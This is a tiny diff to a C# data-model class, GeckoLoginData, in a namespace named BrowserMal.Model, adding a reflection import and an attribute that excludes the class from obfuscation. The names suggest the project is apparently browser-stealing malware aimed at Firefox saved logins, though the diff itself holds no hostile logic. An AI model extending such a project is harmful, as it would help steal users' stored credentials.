@@ -1,5 +1,8 @@
-﻿namespace BrowserMal.Model
+﻿using System.Reflection;
+
+namespace BrowserMal.Model
 {
+    [ObfuscationAttribute(Exclude = true)]
     public class GeckoLoginData
     {
         public long id { get; set; }
